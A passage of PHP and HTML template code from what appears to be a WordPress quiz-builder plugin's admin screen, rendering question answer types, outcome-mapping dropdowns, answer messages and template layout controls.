																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/yes-no.svg"><a href="javascript:void(0)" value="yes_no" >Yes/No</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/text.svg"><a href="javascript:void(0)" value="text" >Text</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/numerical-value.svg"><a href="javascript:void(0)" value="numerical_text" >Numerical Value</a></li>
																	<li class="showHideQueTypeOption_assessment_scoring" style="'.$ques_type_rating.'" ><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/rating.svg"><a href="javascript:void(0)" value="rating" >Rating Scale</a></li>
																	<li class="showHideQueTypeOption" style="'.$ques_type_fill.'"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/fill-in-blank.svg"><a href="javascript:void(0)" value="fill_in_blank" >Fill In Blank</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/file-upload.svg"><a href="javascript:void(0)" value="file_upload" >File Upload</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/slider.svg"><a href="javascript:void(0)" value="slider" >Slider</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/matrix.svg"><a href="javascript:void(0)" class="showQueTypeOption_assessment_scorings"  value="matrix" style="'.$ques_type_matrix.'" >Matrix</a></li>
																	<li class="showHideQueTypeOption_assessment_scoring" style="'.$ques_type_ranking_choices.'"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/ranking-choice.svg"><a href="javascript:void(0)" value="ranking_choices" >Ranking / Choice</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/date.svg"><a href="javascript:void(0)" value="date" >Date</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/dropdown.svg"><a href="javascript:void(0)" value="dropdown" >Dropdown</a></li>
																	<li class="hide_for_poll"><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/complete-the-sentence.svg"><a href="javascript:void(0)" value="matching_text" >Complete the Sentences</a>
																	</li><li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/email.svg"><a href="javascript:void(0)" value="email" >Email</a></li>
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/phone-number.svg"><a href="javascript:void(0)" value="phone_number" >Phone Number</a></li>
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/height.png"><a href="javascript:void(0)" value="weight_and_height" >Weight and Height</a></li>
																	<li><img src="'.plugins_url('').'/smartquizbuilder/includes/images/icons/name.png"><a href="javascript:void(0)" value="name" >Name</a></li>
																</ul>
																'.$answer_type_tool_tip.'
															</div>
															<div class="sqb_ans_multiple" style="'.$showForMultiple.'">
																<button class="multiple-ques-dropdown" title="Limit" id="dropdownMenuQuestionLimit"> <span> ...</span></button>

																
																<div class="sqb-multiple-ans-options" style="display: none;">
																	<div class="sqb-multiple-ans-on-off">
																		<div class="checkbox-custom-style">
																			<input type="checkbox" class="custom-checkbox-input" name="sqb_multiple_ans_limited" '.$show_multiple_ans_checked.'>
																			<span class="custom--checkbox"></span>
																		</div> 
																		<label>Max allowed answers:</label>
																	</div>
																	<div class="sqb-que-limit">
																		<label for="sqb_multiple_ans_input_limit_temp">Limit to <div class="tool-tip">
																						<i class="fa fa-info-circle" aria-hidden="true"></i>
																						<div class="toll-tip-desc">Limit the number of answers that users can pick
																						</div></div></label>
																		<input type="number" min="1" name="sqb_multiple_ans_input_limit" id="sqb_multiple_ans_input_limit_tem" placeholder="Limit" value="'.$sqb_multiple_ans_input_limit.'">
																	</div>
																</div>
															</div>
															</div>
															<div class="add_more_rating_btn" style="'.$add_rating_btn_display.'">Add More Ratings</div>
															
														</div>
															'.$quiz_category_list.'
												</div>';			
												
												
												
							$answersObj = SQB_QuizAnswers::loadByQuestionId($question_id);
							$ans_html  = '';
							$outcome_html  = '';
							$answersdataobj_cout_class = '';
							$ans_info = '';
							$ans_hint = '';
							$recommendation_html = '';
							if(is_array($answersObj) && count($answersObj)){
								//get answers of the question
					 
								if(isset($answersObj) && count($answersObj) < 10){
										$answersdataobj_cout_class = 'ranting_level_'.count($answersObj);
								}
								$recommendation_html = '';
								$outcome_index_count  = 1 ;
								foreach($answersObj as $answerObj){
									$answer_id = $answerObj->getId();
									$ans_data = $answerObj->getAnswer();
									if($answerObj->getRecommendationHtml() != ''){
										$recommendation_html .= '<div class="sqb_ans_item_dot_option" >'.stripslashes($answerObj->getRecommendationHtml()).'</div>';
									}
									$ans_title = $answerObj->getAnswerTitle();
									$ans_hint = $answerObj->getIncorrectAnswerInfo();
									$ans_info = $answerObj->getCorrectAnswerInfo();
									$ans_correct = $answerObj->getCorrectAnswer();
									$tag_ids = $answerObj->getTagIds();
									
									if($tag_ids){
										$ans_data =  str_replace("Add Tags","Edit Tags",$ans_data);
									}

									$ans_data =  str_replace("%%ANSWERID%%",$answer_id,$ans_data);
									$ans_data =  str_replace("%%answerid%%",$answer_id,$ans_data);
									if($ans_correct == 'true'){
										$ans_data =  str_replace("%%SQBANSWERCORRECT%%","checked",$ans_data);
										$ans_data =  str_replace("%%sqbanswercorrect%%","checked",$ans_data);
										$ans_data =  str_replace("sqbanswercorrect","checked",$ans_data);
									}else{
										$ans_data =  str_replace("%%SQBANSWERCORRECT%%","",$ans_data);
										$ans_data =  str_replace("%%sqbanswercorrect%%","",$ans_data);
										if($question_type == 'phone_number' || $question_type == 'email'){

										}else{
											$ans_data =  str_replace("checked","",$ans_data);
										}
										$ans_data =  str_replace("sqbanswercorrect","",$ans_data);
									}
									
									$ans_html .= stripslashes($ans_data);
									
									$outcomeMappingObj = SQB_OutComeMapping::loadByQuizIdQuestionIdAnsId($_GET['id'] ,$question_id,$answer_id);
									if(isset($outcomeMappingObj)){
										$outcome_table_id = $outcomeMappingObj->getId();
										$outcome_ids = $outcomeMappingObj->getOutcomeId();
										$outcome_ids = explode(",",$outcome_ids);
										
										$outcome_result_clone_list = '<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">';
										
										$outcome_hmtl = '';
										if(is_array($outcomes_list)){
											foreach($outcomes_list as $outcome_list){
												
												$outcome_checked = '';
												if(in_array($outcome_list->getId(),$outcome_ids)){
													$outcome_checked = 'checked';
												}
												$outcome_result_clone_list .= '<li data-id="">
																<div class="checkbox-custom-style">
																<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'" '.$outcome_checked.'>
																<span class="custom--checkbox"></span>
															</div>
															<label>'.$outcome_list->getOutcomeName().'</label>
															</li>';
				
											}//foreach loop closed 
										}// if loop closed 
									//echo $outcome_hmtl;
		
									$outcome_result_clone_list .= '</ul>';
									$sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
									//$sqb_round_no = "sqb_round_no_".rand(10,1000).'_';
										 
										$string = $ans_title;
										$character = "<";
										$pos = strpos($string,$character);
										$tag = ">";
										$check = strpos($string,$tag);
										if ($pos !== false && $check == false) {
										    $string_array = explode("<",$string);
										    $string = $string_array[0];
										    $string .= $string_array[1];
										    $string = strip_tags($string);
										    $length = strlen($string);
										    $substr = substr($string, 0, $pos);
										    $substr .= "<";
										    $substr .= substr($string, $pos, $length);

										    $string = $substr;
										} else {
										    $string = strip_tags($string);
										}


									 	$outcome_html   .= '<div class="quiz-content-card"  data-answer-id="'.$answer_id.'" data-id="'.$outcome_table_id.'"  id="'.$sqb_round_no.'"><label for="" class="quiz_label">'.stripslashes($string).' </label><div class="quiz_right-content"><div class="multi-select-dropdown select_outcome_result_wrapper"><div class="multi-select-dropdown-link select_outcome_result_list"> Select Outcomes <i class="fa fa-angle-down"></i></div>'.$outcome_result_clone_list.'</div></div></div>';
										
									}else{

										$outcome_result_clone_list = '<ul class="multi-select-dropdown-list outcome_result_list" style="display: block;">';
										
										if(is_array($outcomes_list)){
											foreach($outcomes_list as $outcome_list){
												
												$outcome_result_clone_list .= '<li data-id="">
																<div class="checkbox-custom-style">
																<input type="checkbox" class="custom-checkbox-input" name="outcome_result_checkbox" value="'.$outcome_list->getId().'">
																<span class="custom--checkbox"></span>
															</div>
															<label>'.$outcome_list->getOutcomeName().'</label>
															</li>';
				
											}//foreach loop closed 
										}// if loop closed 
										
		
										$outcome_result_clone_list .= '</ul>';


										$sqb_round_no = 'sqb_round_no_'.uniqid() . time().'_';
										$outcome_html .= '<div class="quiz-content-card"  data-answer-id="'.$answer_id.'" data-id="%%OUTCOMEMAPPINGID%%" data-answer-index-id="'.$outcome_index_count.'" id="'.$sqb_round_no.'"><label for="" class="quiz_label">'.strip_tags(stripslashes($ans_title)).' </label><div class="quiz_right-content"><div class="multi-select-dropdown select_outcome_result_wrapper"><div class="multi-select-dropdown-link select_outcome_result_list"> Select Outcomes <i class="fa fa-angle-down"></i></div>'.$outcome_result_clone_list.'</div></div></div>';
									}
									
									
									$outcome_index_count++;
									
									
									
								}
								
								$outcome_html   =  $outcome_html;
								
							}
							$phone_email_class = '';
							if($question_type == 'phone_number' ){
								$phone_email_class = ' answer_type_phone sqb_disable_tiny_mce_editor';
							}else if($question_type == 'email'){
								$phone_email_class = ' answer_type_email sqb_disable_tiny_mce_editor';
							}else if($question_type == 'weight_and_height'){
								$phone_email_class = ' answer_type_weight_height sqb_disable_tiny_mce_editor';
							}else if($question_type == 'name'){
								$phone_email_class = ' answer_type_name sqb_disable_tiny_mce_editor';
							}


						$rating_html   = '<div class="question_rating_lable_div sqb_question_drag_drop_item rating_info" style="'.$add_rating_btn_display_text.$rating_box_style.'">
							<div class="question_rating_lable_div_inner question_rating_lable_low rating_info_left">
								<label class="quiz_label">Low Score Label</label>
								<div class="sqb_tiny_mce_editor question_rating_lable_low_text">'.$question_rating_lable_low_text.'</div>
							</div>
							<div class="question_rating_lable_div_inner question_rating_lable_high rating_info_right">
								<label class="quiz_label">High Score Label</label>
								<div class="sqb_tiny_mce_editor question_rating_lable_high_text">'.$question_rating_lable_high_text.'</div>
							</div>
						</div>';
				 		$numeric_class = '';
						$quesitons_html .=	$rating_html; 
						if($question_type == 'matching_text'){
					 		$numeric_class = 'sqb_disable_tiny_mce_editor';
					 	}							
						$quesitons_html .=	'<div class="question_add_answer_outer_div sqb_question_drag_drop_item '.$phone_email_class.$numeric_class.$scoring_quiz_class_pints.$image_option_has_class.$answer_grid_layout_active.$answer_layout_three_in_row_layout_active.$sqb_disable_tiny_mce_editor_class.' '.$answersdataobj_cout_class.' '.$answer_type_matrix_selected_class.' '.$answer_type_single_multi_yes_no_class.'" '.$question_inner_style.'>';
						$hide_for_numeric = "";
						if($question_type == 'matching_text'){
							$hide_for_numeric = "display:none";
							$quesitons_html .= '<div class="numerical-message"><span class="full-text">In the text area below, enter the full text and whatever text you want users to fill out, enclose it with square brackets.</span><span class="see-details"> <a href="javascript:void(0)" class="numerical-sidepopup">See this for details. </a></span>'; 
							 if($quiz_type == 'scoring'){
							 	$quesitons_html .= '<div class="">Points are only assigned for correct answers</div>';
							 }
							 	$quesitons_html .= '</div>';
						}
						
						if($question_type == 'matrix'){
							$ans_html = stripslashes($matrix_html);
							$add_answer_btn_display = "display:none";
							$ans_html = '<div class="sqb_ans_item_matrix"><span class="answer_matrix_options_show sqb_backend_show ">Click to Add/Edit Matrix Answers</span><div class="answer_matrix_save_table">'.$ans_html.'</div><div class="matrix_outcome_mapping"></div><input type="hidden" name="matrix-column-width" value="'.$matrix_column_width.'"></div>';
						}
						$add_more_ans_btn_text = 'Add New Answer';
						if($question_type == 'file_upload'){
						$add_more_ans_btn_text = 'Add Supported File Types';
						}
						$quesitons_html .=	$ans_html;
						$quesitons_html .=	' </div>';
						$ans_outcome_option_wrapper = '';
						if($outcome_html == ''){
							$ans_outcome_option_wrapper = "display:none;";
							
						}
						
						$map_skip_class = ' ';
						$map_not_skip_class = ' outcome-option-active';
						if($skip_outcome_mapping_checked == 'Y'){
							$map_skip_class = ' outcome-option-active';
							$map_not_skip_class = '';
							$ans_outcome_option_wrapper = "display:none;";
						}
						
						/*if($quiz_data->getTemplate() == 'template8'){
							$next_button_html = "";
							$skip_button_html = $question_data->getQuestionsSkipButtonHtml();
							if($skip_button_html == ''){
								$skip_button_html = '<div class="skipped_btn skip-question-btn sqb_tiny_mce_editor sqb_next_btn"><div>Skip Question</div></div>';
							}
							$next_button_html = $question_data->getQuestionsNextButtonHtml();
							if($next_button_html == ''){
							$next_button_html = '<div class="continue-question-btn sqb_tiny_mce_editor single_next_btn sqb_next_btn"><div>Continue</div></div>';
							}
						}*/

						$show_next_button =  $quiz_data->getShowNextButton();	
						if($show_next_button == "Y"){
							$continueButtonStyle = 'display:block;';
						}else if($question_data->question_type == 'multi' || $question_data->question_type == 'text' || $question_data->question_type == 'numerical_text' || $question_data->question_type == 'date' || $question_data->question_type == 'file_upload' || $question_data->question_type == 'slider' || $question_data->question_type == 'dropdown' || $question_data->question_type == 'complete-the-sentence' || $question_data->question_type == 'email' || $question_data->question_type == 'phone_number' || $question_data->question_type == 'weight_and_height' || $question_data->question_type == 'name'){
							$continueButtonStyle = 'display:block';
						}else{
							$continueButtonStyle = 'display:none';
						}

						$quesitons_html .='<div class="skip_continue_button_wrapper">';
						$quesitons_html .=	'<div class="back-question-action" style="'.$backButtonStyle.'">'.$back_btn_html.'</div>';
						$quesitons_html .=	'<div class="skip-question-action" style="'.$skipButtonStyle.'">'.$skip_button_html.'</div>';
						
						$quesitons_html .=	'<div class="continue-question-action" style="'.$continueButtonStyle.'">'.$next_button_html.'</div></div></div></div></div>
						
							<div class="sqb_add_more_question_section">
								<div class="question_add_answer_btn_div sqb_question_drag_drop_item" style="'.$hide_for_numeric.'">
									<div class="question_add_more_ans_btn" style="'.$add_answer_btn_display.'">'.$add_more_ans_btn_text.'</div>
									<div class="assessment_outcome_connect_btn  personality_outcome_connect_btn" style="'.$ans_outcome_option_show.'">
		                                <div class="outcome-options">
		                                    <span class="outcome-option-connect '.$map_not_skip_class.'" >Connect to Outcome </span>
		                                    <span class="outcome-option-skip '.$map_skip_class.'" >Skip Mapping</span>
		                                </div>
		                            </div>
								</div>
							</div>

					<div class="assessment_outcome_connect_wrapper '.$answer_edit_text_class.'" style="'.$ans_outcome_option_wrapper.$ans_outcome_option_show.'">
						<div class="assessment_outcome_head">
								<div class="AO_head_title">Map Answers to Outcome</div>
								
							</div>
							

					<div class="assessment_outcome_connect" style="'.$ans_outcome_option_hide.'"> '.$outcome_html.'
							

						</div> 
						</div> ';
					 
					 if($quiz_data->getTemplate() == 'template4'){	
								$quesitons_html .='</div>';	
					}	

					$show_qns = "display:none";
								$hide_qns = "display:block";
								if(isset($quiz_data)){
									$question_bank = $quiz_data->getQuestionBankOption();

									$question_bank_explode = explode('||',$question_bank);


									if($question_bank_explode[0] == 'Y'){
										 $show_qns = "display:inline-block";
										 $hide_qns = "display:none";
									}else{
										$show_qns = "display:none";
										$hide_qns = "display:block";

									}		

								}
					
					$quesitons_html .='

					<div class="QA-advance-option">
					<div class="quiz-content-card show_correct_inccorect_ans_checkbox_wrapper">
						<label for="" class="quiz_label">Do you want to display incorrect/correct answers?</label>
						<div class="quiz_right-content">
							<div class="square-switch_onoff">
								<input class="checkbox" name="show_correct_inccorect_ans_checkbox" type="checkbox" id="show_correct_inccorect_ans_checkbox_'.$sqb_correct_incorrect_random_no.'" value="Y" '.$show_correct_incorrect_ans.' >
								<label for="show_correct_inccorect_ans_checkbox_'.$sqb_correct_incorrect_random_no.'"></label>
							</div>
						</div>
					</div>
					
					
					<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
							<label for="" class="quiz_label">Correct answer message</label>
							<div class="quiz_right-content">
								<textarea class="sqb_correct_ans sqb_text_tiny_mce_editor">'.stripslashes($ans_info).'</textarea>
							</div>
					</div>
					<div class="quiz-content-card sqb_incorrect_correct_ans_wrapper" style="display:none">
							<label for="" class="quiz_label">Incorrect answer message</label>
							<div class="quiz_right-content">
								<textarea class="sqb_incorrect_ans sqb_text_tiny_mce_editor">'.stripslashes($ans_hint).'</textarea>
								
							</div>
					</div>
									
					
						
						
						
					</div>';
					
					
					
					if($quiz_type != 'poll'){
					$quesitons_html .= '<div class="save_and_add_more_quesiton_btn_wrapper">
						<div class="save_question_btn" onclick="save_single_question()" >Save This Question</div>
						<div class="add_more_question_btn" onclick="sqb_add_more_question()" style='.$hide_qns.'>Add More Questions</div>
						<a class="btn sqb_transprent_btn sqb-add-question-layout" href="javascript:void(0)" style="'.$show_qns.'">Add Question</a>
					</div>';
					}
				$quesitons_html .= '</div>
				<div class="sqb_answer_bot_option_wrapper_outer">'.$recommendation_html.'</div>	
				
			</div>';	
			
			$quesitons_html .= '</div>';			
			$quesitons_html .= '</div>';			
			$quesitons_html .= '</div>';			
					   }	 
				   } 
			   }// foreach loop closed
			}
		?>

		<div class="sqbv2-main-template">
			<div class="sqbv2-left-side-template">
				<div class="question_tab_to_main_heading_wrapper">
                                <!--h5 class="quiz--sub-title">Questions  </h5 -->
                                <?php if($quiz_type != 'poll'){ ?>
                                	<div class="show-question-counts questions_pagination_html"> <?php echo $question_content; ?> </div>

                                    <a href="#" class="btn sqb_transprent_btn reorder_questions_btn sqb_rearrange_question" onclick="sqb_rearrange_question()"> <i class="fa fa-arrows" aria-hidden="true"></i></i> Question Settings</a>
                                
                                	<a href="#" class="btn sqb_transprent_btn sqb-insert-ads" onclick="sqb_question_insert_ads()" style="<?php if($quiz_ads_option == 'Y'){ echo 'display:block'; }else{ echo 'display:none;'; }?>"> <!-- <i class="fa fa-arrows" aria-hidden="true"></i></i> --> Insert Ads</a>

                                
                                <input type="hidden" name="clone_question_status" value="<?php echo $clone_question_status;?>">
                                <input type="hidden" name="clone_question_id" value="<?php echo $clone_question_id;?>">
                                <input type="hidden" name="clone_outcome_status" value="<?php echo $clone_outcome_status;?>">
                                <input type="hidden" name="clone_outcome_id" value="<?php echo $clone_outcome_id;?>">
                                <input type="hidden" name="add_new_question_action"  value="<?php echo $q_action;?>">
                                <input type="hidden" name="add_new_outcome_action"  value="<?php echo $oc_action;?>">
                                <input type="hidden" name="active_tab_question_screen"  value="<?php echo $active_tab_question_screen;?>">
                                <input type="hidden" name="active_tab_outcome_screen"  value="<?php echo $active_tab_outcome_screen;?>">

                                <input type="hidden" name="ans_id_new" class="ans_id_new"  value="<?php echo $ans_id_new;?>">
                                <input type="hidden" value="<?php echo $alloutcomecount; ?>" id="get_all_outcome_count">


                                <?php if(isset($quiz_data)){
                                    $question_bank = $quiz_data->getQuestionBankOption();
                                    $question_bank_explode = explode('||',$question_bank);
                                    $show_qns = "display:block";

                                    if($question_bank_explode[0] == 'Y'){
                                         $show_qns = "display:none";
                                    }       
                                } ?>

                                
                                <div class="enable_branching_outer_wrapper" style="<?php if((isset($quiz_data) && $quiz_data->getQuizPagination() == 'all' && $same_page_option == 'no_next_button') || (isset($quiz_data) && $quiz_data->getQuizPagination() == 'all' && $same_page_option == 'category_names')){ echo 'display:none;'; }  ?>">
                                <div class="checkbox-custom-style enable_branching_outer">
                                    <input type="checkbox" class="custom-checkbox-input" name="enable_branching" <?php if(isset($quiz_data) && ($quiz_data->getEnableBranching() == 'Y')){echo 'checked="checked"'; }?>>  
                                    <span class="custom--checkbox"></span>
                                </div>
                                <label class="enable_branching_outer_label">Enable Branching <div class="tool-tip">
                                    <i class="fa fa-info-circle" aria-hidden="true"></i>
                                    <div class="toll-tip-desc">To creating branching quiz (where next question depends on previous answer), first add all questions here, and then in the final tab ("Shortcode"),
                                click on the braching quiz button. <br/> 
                                You can customize the width, colors and other css styles in the customizer tab.</div>
                                </div>
                            </label>
                            </div>
                        <?php } ?>
                                <?php 
                                $show_qns = "display:none";
                                $hide_qns = "display:block";
                                if(isset($quiz_data)){
                                    $question_bank = $quiz_data->getQuestionBankOption();

                                    $question_bank_explode = explode('||',$question_bank);


                                    if($question_bank_explode[0] == 'Y'){
                                         $show_qns = "display:inline-block";
                                         $hide_qns = "display:none";
                                    }else{
                                        $show_qns = "display:none";
                                        $hide_qns = "display:block";

                                    }       

                                } ?>
                            <div class="preview-section">
                                <!-- <a class="btn sqb_transprent_btn sqb-question-bank" href="javascript:void(0)">Add Question</a> -->
                                
                                <a data-toggle="modal" data-target="#openpreview" class="btn sqb_transprent_btn sb-preview-quiz" href="javascript:void(0)">Preview Quiz</a>
                                <?php if($quiz_type != 'poll'){ ?>
                                <a style="<?php echo $hide_qns; ?>" href="#" class="add_more_link" onclick="sqb_add_more_question()"> <i class="fa fa-plus" aria-hidden="true" ></i> Add A New Question</a> 
                            <?php } ?>
                                <a class="btn sqb_transprent_btn sqb-add-question-layout" href="javascript:void(0)" style="<?php echo $show_qns; ?>">Add Question</a>
                            </div>


                
                </div>
				<div class="have-no-quiz have_noques " <?php if($question_has){ echo 'style="display:none"'; } ?>>
					<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
					<h3>You do not have any questions currently. Please add a new question.</h3>
					
					<a href="javascript:void(0);" class="add_ques sqb_add_question" ><i class="fa fa-plus-circle" aria-hidden="true"></i>Add a Question</a>
				</div>
				<div class="SQB-screen-head-info quiz-temp5-ques_ans_contain">
					<div class="Template-Customize-content">
						<div class="left_side_question_list" <?php if(!$question_has){ echo 'style="display:none"'; } ?>>
							<ul class="nav">
								<?php echo $question_data_list_count;?>
							</ul>

							<span data-id="9" class="HowCalculatorWork" id="HowCalculatorWork9" style="display: none;">How does calculator work?</span>

							<div class="HowCalculatorWorkShowHide9 HowCalculatorWorkCommonClass" style="display: none;"><span class="closeHowCalculatorWork" data-id="9">x</span><p>Add your questions here and set the formulas in the formula tab. Add any type of questions but only single choice, multiple choice, slider, yes/no type questions can be used in the formulas.  The points assigned here will be used in the calculations.</p></div>
						</div>
					</div>
					<div class="Template-Customize-setting-outer">
						
					</div>
				</div>
				<div class="Quiz-Question-Answer-outer">
			

	    
			
					<div class="Question-Answer-accordion ques_ans_contain quiz-temp5-ques_ans_contain"  <?php if(!$question_has){ echo 'style="display:none"'; } ?>>
					
					<div class="Template-Customize-content_question Template-Customize-content">
						<link id ="question_css" href="<?php echo plugin_dir_url(__FILE__); ?>../../includes/templates/quiz/template1/template1.css?<?php echo rand(10,1000);?>" rel="stylesheet">
						<link id ="question_css" href="<?php echo plugin_dir_url(__FILE__); ?>../../includes/css/question_ans_layout.css?<?php echo rand(10,1000);?>" rel="stylesheet">
						
							
						<div class="sqb_questions_wrapper right-side tab-content">
							<?php 
							if(count($questionsObj) && isset($_GET['id'])){
								echo $quesitons_html;
							}else if(0){ ?>	
								
								
							<div class="card sqb_question_no tab-pane fade in active show" id="sqb_question_collapseOne">
								<div class="card-header" id="headingOne" style="display:none">
									<i class="fa fa-arrows question_sortable_icon" aria-hidden="true"></i> <a>Question 1</a>
									<div class="delete-qa-row"> <i class="fa fa-trash" aria-hidden="true"></i></div>
									
								</div>

								

								<div  class="sqb_question_collapse">
									<div class="delete-qa-row sqb_delete_btn">Delete</div>
									<div class="card-body">
										<?php $question_html =  sqbAddMoreQuestions();
											$current_date_time = date('y_d_m_h_m_s');
											$current_date_time_img = "sbq_img_".$current_date_time;
											$current_date_time_img_outer = "sbq_img_outer_".$current_date_time;
											$current_date_time_mian_div = "sbq_amin_div_".$current_date_time;
											$sqb_random_no = $current_date_time.'_'.rand(10,1000);
											$question_html = str_replace('%%CURRENTDATETIMEIMAAOUTER%%',$current_date_time_img_outer,$question_html);
											$question_html = str_replace('%%CURRENTDATETIMEIMG%%',$current_date_time_img,$question_html);
											$question_html = str_replace('%%CURRENTDATETIMEMAINDIV%%',$current_date_time_mian_div,$question_html);
											$question_html = str_replace('%%SQBRANDOM%%',$current_date_time_mian_div.'_'.rand(10,1000),$question_html);
											$question_html = str_replace('%%SQBRANDOMNO%%',$sqb_random_no.'_'.rand(10,1000),$question_html);
											$question_html = str_replace('sqb_text_tiny_mce_editor_rename','sqb_text_tiny_mce_editor',$question_html);
											$question_html = str_replace('sqb_tiny_mce_editor_rename','sqb_tiny_mce_editor',$question_html);

											echo $question_html;

										?>
									</div>
								</div>
							</div>
							
							<?php } ?>
							
							</div>
							
					</div> <!-- left side bar close -->
	





					<div id="afterSaveQuestion"></div>
				</div>
				</div>
			</div>
			<div class="sqbv2-right-side-customizer">
				<div class="responsive-screen-link" <?php if(!$question_has){ echo 'style="display:none"'; } ?> >
						<a href="javascript:void(0)" title="Click to desktop view" class="sqb_desktop_view sqb_device_active_view"><i class="fa fa-laptop" aria-hidden="true"></i></a>
						<a href="javascript:void(0)" title="Click to mobile view" class="sqb_mobile_view spc_active_view" data-action="quesm_screen"><i class="fa fa-mobile" aria-hidden="true"></i></a>
						<!--a href="javascript:void(0)" title="Click to set global view" class="sqb_set_questions_global_theme"><i class="fa fa-globe" aria-hidden="true"></i></a-->
					</div>
					<button class="show-merge-popup" data-page="question">Click to see All Merge Tags</button>
				<div class="Template-Customize-setting-outer"  >
					<div class="Template-Customize-setting-outer">
						<?php 
						if(isset($quiz_data)){

							$template =  $quiz_data->getTemplate();
							if($template == "template6" || $template == "template7" || $template == "template9"){ 
								$show_question_settings = 'display:none';
							}else{
								//$show_question_settings = 'display:block';
								if($template == 'template5'){
									$show_question_settings = '';
								}else{
									$show_question_settings = 'display:none';
								}
							}
						}
						?>
						<div class="Template-Customize-Setting Template-Customizer-Section template9-customizer-options"  style="<?php if($template_checked9 == "checked"){}else{ echo 'display:none;'; } ?>">
								<div class="showHideLeftSidebaroptions">
									<h3 class="Template-Customize_heading" >Template Customizer  
										<div class="customize_open_close">   
											<i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
											<i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
										</div>
									</h3> 
								</div>

								<div class="customizer_innner_sections hide_for_global_theme_enabled">
									<div class="Template-Customize-element template9_width_height_option">
										<div class="Template-Customize-element-inner question_temp_width">
											<h4 class="sqb-small-heading-with-border">Width/Height</h4>
											<div class="inner_template_style_box image_opacity_btn">
				                                <h4>Focus Mode</h4>
				                                <div class="quiz_right-content">
				                                    <div class="square-switch_onoff">
				                                        <input class="checkbox" name="focus_mode" type="checkbox" id="template9_focus_mode_question" value="<?php echo $temp9_focus_mode; ?>" <?php if($temp9_focus_mode == 'Y') { echo 'checked'; }else { echo '';} ?>>
				                                        <label for="template9_focus_mode_question"></label>
				                                    </div>
				                                </div>
				                            </div>

				                            <div class="inner_template_style_box image_opacity_btn template9-enable-disable-width" style="<?php if($temp9_focus_mode == 'Y'){ echo 'display:none'; } ?>">
												<h4>Width</h4>
												<div class="d-flex align-items-center">
													<p>
														<input id="template9_background_width_question" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="370" data-slider-max="2000" data-slider-step="1" data-slider-value="<?php if($temp9_temp_width){echo $temp9_temp_width;}else{
															echo '2000';
														} ?>">
													</p>
													<div class="slider-user-value">
														<input type="text" class="template9_select_background_width" name="template9_select_background_width" value="<?php if($temp9_temp_width){echo $temp9_temp_width;}else{
															echo '2000';
														} ?>">
														<p class="px-value">px</p>
													</div>
												</div>
											</div>	

				                            <div class="inner_template_style_box image_opacity_btn height-px-vh-v2" style="">
												<h4>Height</h4>
												<?php 
												$temp9_selected_height_px = '';
												$temp9_selected_height_per = '';
												$temp9_show_height_px_div = 'display:none';
												$temp9_show_height_per_div = 'display:none';
													
												if($temp9_selected_val == 'vh'){
													$temp9_selected_height_per = 'selected="selected"';
													$temp9_show_height_per_div = 'display:block';
												}else{
													$temp9_selected_height_px = 'selected="selected"';
													$temp9_show_height_px_div = 'display:block';
												} ?>


												<div class="template9-start-screen-background-height-px_v2" style="<?php echo $temp9_show_height_px_div?>">
													<div class="d-flex align-items-center">
														<p>
															<input id="" class="slider template9_background_height_question_v2" data-slider-id="ex1Slider" type="text" data-slider-min="10" data-slider-max="1200" data-slider-step="1" data-slider-value="<?php if($temp9_temp_height){echo $temp9_temp_height;}else{
																echo '500';
															} ?>">
														</p>
														<div class="slider-user-value">
															<input type="text" class="template9_select_background_height_v2" name="select_background_height_v2" value="<?php if($temp9_temp_height){echo $temp9_temp_height;}else{
																echo '500';
															} ?>">
															<select class="template9-start-screen-select-background-height_v2" name="select-background-height_v2">
																<option value="px" <?php echo $temp9_selected_height_px; ?>>px</option>
																<option value="vh" <?php echo $temp9_selected_height_per; ?>>vh</option>
															</select>
														</div>
													</div>
												</div>

												<div class="template9-start-screen-background-height-vh_v2" style="<?php echo $temp9_show_height_per_div?>">
													<div class="d-flex align-items-center">
														<p>
															<input id="" class="slider template9_background_height_vh_question_v2" data-slider-id="ex1Slider" type="text" data-slider-min="1" data-slider-max="100" data-slider-step="1" data-slider-value="<?php if($temp9_temp_height){echo $temp9_temp_height;}else{
																echo '50';
															} ?>">
														</p>
														<div class="slider-user-value">
															<input type="text" name="template9_select_background_height_vh_v2" value="<?php if($temp9_temp_height){echo $temp9_temp_height;}else{
																echo '50';
															} ?>">
															<select class="template9-start-screen-select-background-height_v2" name="select-background-height_v2">
																<option value="px" <?php echo $temp9_selected_height_px; ?>>px</option>
																<option value="vh" <?php echo $temp9_selected_height_per; ?>>vh</option>
															</select>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element template9_customizer">
										<div class="Template-Customize-element-inner question_temp_width" style="display:block">
											<h4 class="sqb-small-heading-with-border">Layout Options</h4>
											<div class="inner_template_style_box sqb-screen-layout-wrapper">
												<div class="sqb-radio-button-wrapper multi-column-view">
